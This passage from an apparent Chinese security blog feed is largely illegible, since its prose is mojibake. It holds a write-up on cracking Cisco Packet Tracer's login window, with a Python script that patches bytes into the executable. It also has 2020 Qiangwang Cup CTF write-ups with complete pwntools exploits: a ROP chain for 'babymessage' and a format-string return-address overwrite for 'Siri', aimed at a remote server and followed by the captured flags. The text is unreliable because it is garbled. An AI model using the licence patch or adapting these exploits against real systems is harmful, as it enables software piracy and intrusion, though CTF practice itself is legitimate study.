æ³•è¯†åˆ«ï¼Œå…¶æ˜¯è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><p>ç„¶åå°±æ˜¯ä¸€ä¸ªä¸ªè½¬å­—ç¬¦ä¸²ï¼Œä»¥v12-v27æ•´åˆä¸€ä¸‹,<code>BZ9dmq4c8g9G7bAY</code>å‡ºæ¥è¿™ä¸ªã€‚<br>å¹¶ä¸”å¯ä»¥çœ‹åˆ°åˆ¤æ–­å°±æ˜¯16ä½ã€‚<br>ç„¶åè¿›è¡Œè¾“å…¥åˆ¤æ–­:<br><img src="http://qiqianyun.chumen77.xyz/uPic/8zufHQ.png" srcset="/img/loading.gif" alt><br>å°±å¾ˆç®€å•æˆåŠŸæ‹¿åˆ°ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®æˆ˜å»é™¤packet tracerç™»é™†çª—å£</title>
    <link href="/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/"/>
    <url>/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£"><a href="#å®æˆ˜å»é™¤æ€ç§‘packet-tracerç™»é™†çª—å£" class="headerlink" title="å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£"></a>å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>ä¸“ä¸šè¯¾å¼€è®¾äº†è·¯ç”±äº¤æ¢è¿™é—¨è¯¾ï¼Œå…¶ä¸­è¦ç»å¸¸ä½¿ç”¨packet tracerè¿™ä¸ªè½¯ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰æ³¨å†Œçš„è¯ï¼Œæ¯æ¬¡ç™»é™†éƒ½éœ€è¦ç­‰å¾…15sï¼Œå°±å°è¯•ç ´è§£ä¸€ä¸‹ã€‚</p><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><p>ç ´é™¤ç­‰å¾…çš„15sï¼Œæœ€å¥½ç›´æ¥å»é™¤æ‰ç™»é™†çª—å£ã€‚ä½†æ˜¯è€å¸ˆä¸Šè¯¾ç»™æˆ‘ä»¬æ¼”ç¤ºè¿‡ï¼Œæœ‰ä¸ªå¾çˆ±ç ´è§£çš„æ’ä»¶æ˜¯ç›´æ¥ç ´è§£æ‰ç™»é™†çª—å£çš„ï¼Œå°±ç›´æ¥å¥”ç€è¿™ä¸ªç›®æ ‡å»ã€‚</p><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><ul><li>win7 æ¨¡æ‹Ÿå™¨</li><li>packet tracer 7.11</li><li>x64dbg</li></ul><h2 id="ç ´è§£è¿‡ç¨‹è®°å½•"><a href="#ç ´è§£è¿‡ç¨‹è®°å½•" class="headerlink" title="ç ´è§£è¿‡ç¨‹è®°å½•"></a>ç ´è§£è¿‡ç¨‹è®°å½•</h2><h3 id="å¯»æ‰¾çªç ´å£"><a href="#å¯»æ‰¾çªç ´å£" class="headerlink" title="å¯»æ‰¾çªç ´å£"></a>å¯»æ‰¾çªç ´å£</h3><p>ï¿¼åœ¨å¼¹å‡ºç™»é™†ç•Œé¢æ—¶ï¼Œæœ€ä¸Šæ–¹ä¼šæœ‰ <code>netacad.com Login</code>çš„å­—çœ¼ï¼Œå…ˆå°±é€‰æ‹©è¿™é‡Œä½œä¸ºå…³é”®å­—ç¬¦ä¸²ã€‚<br>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/K55z1P.jpg" srcset="/img/loading.gif" alt><br>åœ¨è¿™ä¸ªexeçš„ç¨‹åºä¸‹æœç´¢å­—ç¬¦ä¸²ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/H1st15.jpg" srcset="/img/loading.gif" alt><br>ç«¯å£å¯ç–‘å­—ç¬¦ä¸²å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ã€‚</p><p>ç„¶åå¼€å§‹f9ä¸€ç›´è¿è¡Œï¼Œåœ¨è¿™ä¸ª<code>netacad.com Login</code>ï¼Œè¿è¡Œå…¶åçš„è½¯ä»¶ä¼šå‘ç°ï¼Œçš„ç¡®å¼€å¯äº†ç™»é™†çš„çª—å£ã€‚è¿™æ ·å°±å¯ä»¥ç¡®å®šï¼Œå…³é”®å¤„å°±åœ¨è¿™é‡Œã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/6Hr3Tw.png" srcset="/img/loading.gif" alt><br>å‘ä¸‹çœ‹å¯ä»¥çœ‹åˆ°ï¼Œä¸€äº›ç™»é™†å¤±è´¥çš„å­—ç¬¦ä¸²ï¼Œé‚£å°±æ— ç–‘æ˜¯è¿™ä¸€å—çš„å‡½æ•°æ§åˆ¶ç€è¿™ä¸ªç™»é™†çª—å£ã€‚</p><p>å‘ä¸Šçœ‹å¯ä»¥çœ‹åˆ°ï¼Œæœ‰å‡ ä¸ªå°è·³è½¬ï¼Œå’Œä¸€ä¸ªå¤§è·³è½¬ï¼Œç„¶åè¿½è¿‡å»å¯ä»¥å‘ç°ï¼Œæ˜¯å¯ä»¥ç»•è¿‡è¿™äº›å…³é”®å‡½æ•°çš„ã€‚é‚£å°±å¾ˆç®€å•äº†ï¼Œå°è¯•æ”¹æˆ<code>jmp</code> æ— æ¡ä»¶è·³è½¬ä¸€ä¸‹è¯•ä¸€è¯•ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f42dGL.png" srcset="/img/loading.gif" alt></p><p>ç„¶åç›´æ¥è¿è¡Œä¸€ä¸‹ï¼Œç„¶åçš„ç¡®æ˜¯æˆåŠŸäº†ï¼Œå»æ‰äº†ç™»é™†æ¡†ã€‚</p><p>ç„¶åè¿›è¡Œä¿å­˜è¡¥ä¸ï¼Œæ›¿æ¢ä¸»ç¨‹åºå³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OikyWs.png" srcset="/img/loading.gif" alt></p><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>çš„ç¡®æ˜¯æ‰¾åˆ°äº†å…³é”®å¤„ï¼Œæ„Ÿè§‰æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œç”±äºå‰äººç»éªŒå°±æ˜¯ä»ç™»é™†ç•Œé¢ä¸‹æ‰‹çš„ï¼Œæˆ‘ä¹Ÿæ˜¯ç›´æ¥è·Ÿéšè¿™ä¸ªæ€è·¯æ“ä½œã€‚åœ¨å®Œå·¥ä»¥åï¼Œå°è¯•å»æä¸€ä¸‹15så“ªé‡Œçš„éªŒè¯ï¼Œæƒ³ç‚¹ä¸€ä¸‹ç›´æ¥å˜ä¸º0sï¼Œå¯ä»¥ç‚¹å‡»ç¡®è®¤ï¼Œå‘ç°æ˜¯çš„ç¡®éº»çƒ¦ä¹Ÿæ²¡æœ‰æˆåŠŸå°±æ”¾å¼ƒäº†ã€‚</p><h2 id="åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸"><a href="#åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸" class="headerlink" title="åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸"></a>åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸</h2><p>ä¸å¤ªä¼šå†™cï¼Œç”¨python å†™äº†æ‰“è¡¥ä¸çš„ç¨‹åºï¼Œç¡®ä¿æœ¬æœºæœ‰python2çš„è¿è¡Œç¯å¢ƒã€‚ç„¶åæŠŠè„šæœ¬æ”¾åœ¨å…¶å®‰è£…è·¯å¾„çš„binç›®å½•ä¸‹ï¼Œè¿è¡Œå³å¯ã€‚</p><p>ä¹Ÿå¯ä»¥æŠŠç¨‹åºæ‹–å‡ºæ¥ï¼Œæ‰“å®Œè¡¥ä¸åæ›¿æ¢åŸæ¥çš„ç¨‹åºå³å¯ã€‚</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> os<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">WriteFile</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'PacketTracer7.exe'</span>,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:         dt = f.read()    dt = dt[:<span class="hljs-number">0x17a5245</span>]+<span class="hljs-string">'\xe9\xee\x04\x00\x00\x90'</span>+dt[<span class="hljs-number">0x17a524b</span>:]    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'PacketTracer7.exe'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:        f.write(dt)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:WriteFile()</code></pre></div><p>é’ˆå¯¹çš„åªæ˜¯7.11ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®</title>
    <link href="/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <url>/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®"><a href="#å¼ºç½‘æ¯2020-éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®"></a>å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®</h1><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr"> RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr"> Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr"> NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr"> PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3fe000)</span></code></pre></div><p>åŸºæœ¬ä¿æŠ¤ä¸ç®—å¤šã€‚</p><p>æ˜¯ä¸€ä¸ªä¼ªå †é¢˜ã€‚</p><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>åœ¨ <code>leave_message(v1)</code>å‡½æ•°è¿™é‡Œçš„v1ä¸Šæ¥å–å€¼å°±æ˜¯16</p><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">leave_message</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a1)</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ST14_4</span>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"message: "</span>);  v1 = read(<span class="hljs-number">0</span>, &amp;v3, a1);  <span class="hljs-built_in">strncpy</span>(buf, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;v3, v1);  buf[v1] = <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"done!\n"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><p>è¿›å…¥ä»¥åå¯ä»¥å‘ç°ï¼Œv3æ˜¯åªæœ‰8å­—èŠ‚å¤§å°çš„ï¼Œå¯ä»¥æº¢å‡º8å­—èŠ‚ï¼Œå¯ä»¥è¦†ç›–åˆ°rbpã€‚</p><h5 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h5><div class="hljs"><pre><code class="hljs undefined">.text:<span class="hljs-number">0000000000400985</span> ; <span class="hljs-number">22</span>:         <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">256</span> ).text:<span class="hljs-number">0000000000400985</span>                 cmp     [rbp+var_4], <span class="hljs-number">100</span>h.text:<span class="hljs-number">000000000040098</span>C                 jle     short loc_400995.text:<span class="hljs-number">000000000040098</span>E ; <span class="hljs-number">23</span>:           v1 = <span class="hljs-number">256</span>;.text:<span class="hljs-number">000000000040098</span>E                 mov     [rbp+var_4], <span class="hljs-number">100</span>h.text:<span class="hljs-number">0000000000400995</span> ; <span class="hljs-number">24</span>:         leave_message(v1);</code></pre></div><p>åœ¨è¿›å…¥<code>leave_message(v1)</code>å‰v1æœ‰ä¸€ä¸ªå¯¹äº0x100å¤§å°çš„åˆ¤æ–­ï¼Œè¦æ˜¯v1å¤§äº0x100å°±ç»™è®¾ç½®ä¸º0x100ã€‚è¿™å°±å¯ä»¥å®ç°æ ˆæº¢å‡ºï¼Œè¿›è¡Œropã€‚</p><p>æ€ä¹ˆæ§åˆ¶v1ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span></code></pre></div><p>å¯ä»¥æ˜æ˜¾çœ‹åˆ°v1åœ¨rbp-4çš„åœ°å€ï¼Œç„¶årbpï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæº¢å‡ºè¦†ç›–ï¼Œè¦†ç›–åˆ°åˆé€‚çš„åœ°æ–¹åï¼Œä¿éšœ-4åï¼Œæœ‰ä¸ªintå¤§å°çš„å¤§äºç­‰äº0x100çš„å€¼å³å¯ã€‚</p><p>è¿™ä¸ªåˆé€‚åœ°å€ï¼Œå¯ä»¥ä»<code>leave_name()</code> ä¸‹æ‰‹ï¼Œå› ä¸ºå…¶å¾€bssæ®µè¯»äº†å€¼ã€‚</p><div class="hljs"><pre><code class="hljs undefined">byte_6010D0[(signed <span class="hljs-built_in">int</span>)read(<span class="hljs-number">0</span>, byte_6010D0, <span class="hljs-number">4</span>uLL)] = <span class="hljs-number">0</span>;</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/8uyl03.png" srcset="/img/loading.gif" alt></p><h3 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h3><ul><li>æ„é€ ropé“¾ï¼Œæ³„æ¼å‡ºlibcçš„åœ°å€ï¼Œè¿”å›startï¼Œè®©ç¨‹åºé‡æ–°è·‘èµ·æ¥ï¼Œæ¸…ç†æ ˆ</li><li>å†æ¬¡åˆ©ç”¨ï¼Œæ§åˆ¶ret address ä¸º<code>one_gadget</code></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./babymessage'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.170.202'</span>,<span class="hljs-number">21342</span>)    libc = elf.libc    libc = ELF(<span class="hljs-string">'./libc-2.27.so'</span>)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()pop_rdi = <span class="hljs-number">0x0000000000400ac3</span>start = <span class="hljs-number">0x04006E0</span>sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)sa(<span class="hljs-string">'name'</span>,p32(<span class="hljs-number">0xffff</span>))sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)sa(<span class="hljs-string">'mes'</span>,payload)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)rop = flat([pop_rdi,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],start])payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)payload +=ropsa(<span class="hljs-string">'mes'</span>,payload)ru(<span class="hljs-string">'done!'</span>)r(<span class="hljs-number">2</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)sa(<span class="hljs-string">'name'</span>,p32(<span class="hljs-number">0xffff</span>))sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-comment"># debug()</span>payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)sa(<span class="hljs-string">'mes'</span>,payload)rec = <span class="hljs-number">0x10a45c</span> + libc_basesla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)rop = p64(rec)payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)payload +=ropsa(<span class="hljs-string">'mes'</span>,payload)itr()</code></pre></div><div class="hljs"><pre><code class="hljs python">flag&#123;f4c1c2c2407055f2665dec486e7d1b16&#125;</code></pre></div><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ã€‚æ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥æ— é™æ¬¡è§¦å‘ã€‚</p><h4 id="æ¼æ´ç‚¹-1"><a href="#æ¼æ´ç‚¹-1" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_1212</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1)</span></span>&#123;  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// [rsp+18h] [rbp-128h]</span>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+20h] [rbp-120h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+138h] [rbp-8h]</span>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);  v2 = <span class="hljs-built_in">strstr</span>(a1, <span class="hljs-string">"Remind me to "</span>);  <span class="hljs-keyword">if</span> ( !v2 )    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x110</span>uLL);  <span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"&gt;&gt;&gt; OK, I'll remind you to %s"</span>, v2 + <span class="hljs-number">13</span>);  <span class="hljs-built_in">printf</span>(&amp;s);  <span class="hljs-built_in">puts</span>(&amp;::s);  <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;&#125;</code></pre></div><p>å‘ç°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ä½ æ‰€è¾“å…¥çš„éƒ½ä¼šè¢«sprintfå¤„ç†ä»¥åç»™printfå‡½æ•°ã€‚ç”±äºå…¶æ˜¯<code>%s</code>æ¥å¤„ç†æ•°æ®ï¼Œè¿™å°±è®©ç›´æ¥åœ¨æ ˆä¸Šå†™åœ°å€ï¼Œç„¶åæ”»å‡»é€ æˆäº†éš¾åº¦ã€‚<br>ä½†æ˜¯è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå…¶å®è¾“å…¥çš„ä¸œè¥¿è¿˜ä¼šä¿ç•™åœ¨æ ˆä¸Šï¼Œå› ä¸ºsprintfå¤„ç†æ•°æ®ä¹Ÿæ˜¯ä»æ ˆä¸Šæ‹¿çš„ï¼Œæ‰€ä»¥ä¼šè¢«ä¿ç•™çš„ã€‚</p><h4 id="æ”»å‡»-1"><a href="#æ”»å‡»-1" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h4><ul><li>ç¬¬ä¸€æ¬¡è§¦å‘ï¼Œæ³„æ¼å‡ºlibcåœ°å€ï¼Œstackåœ°å€ã€‚</li><li>æ‰§è¡Œåˆ°printfå‡†å¤‡è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œç”¨sprintfæ®‹ç•™æ ˆä¸Šçš„æ•°æ®ï¼ˆåœ¨0x100åï¼‰ï¼Œè¿™ä¸ªéœ€è¦ç²¾å¿ƒæ„é€ å¥½åï¼Œè¿›è¡Œæ”»å‡»ret addressã€‚éœ€è¦ä¸€æ¬¡æ€§æ”¹å¥½ã€‚</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.170.202'</span>,<span class="hljs-number">12124</span>)    <span class="hljs-comment"># libc = elf.libc</span>    libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_attc</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'Hey Siri!'</span>)    r()a = <span class="hljs-string">'Remind me to '</span>start_attc()payload = str(a) + <span class="hljs-string">'%83$p'</span> + <span class="hljs-string">'bbb'</span> + <span class="hljs-string">'%7$p'</span><span class="hljs-comment"># ru('&gt;&gt;&gt;')</span>s(payload)ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x21b97</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)ru(<span class="hljs-string">'bbb0x'</span>)stack_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x150</span>info_addr(<span class="hljs-string">'stack_base'</span>,stack_base)tag = stack_base + <span class="hljs-number">0x148</span>start_attc()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">27</span>fmtpayload = <span class="hljs-string">""</span>key = <span class="hljs-number">0x4f365</span> + libc_baseinfo_addr(<span class="hljs-string">'key'</span>,key)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    fmtpayload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">55</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>print(fmtpayload)payload = str(a) + fmtpayloadpayload +=<span class="hljs-string">'aaa'</span> + <span class="hljs-string">'b'</span> + p64(tag)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span> + p64(tag+<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span>  + p64(tag+<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span> + p64(tag+<span class="hljs-number">6</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">2</span>s(payload)itr()</code></pre></div><div class="hljs"><pre><code class="hljs python">flag&#123;da8836b9e9df3db44fe4bd7f39d4f7ab&#125;</code></pre></div><h2 id="water-re"><a href="#water-re" class="headerlink" title="water_re"></a><code>water_re</code></h2><p>Idaåç¼–è¯‘åçš„ä»£ç æ¯”è¾ƒéš¾çœ‹ï¼Œå‘ç°é‡ç‚¹æ•°æ®é€ æˆäº†å›°éš¾ï¼Œå°±é‡‡å–åŠ¨æ€è°ƒè¯•ã€‚</p><p>åŸºæœ¬æµç¨‹å°±æ˜¯ï¼Œgetsä¸€æ®µä½ è¾“å…¥çš„flagï¼Œè¯»å…¥åç”¨<code>sub_12f0_</code>è¿›è¡Œå¤„ç†ï¼Œç„¶åç»™<code>v10</code> <code>v11</code> 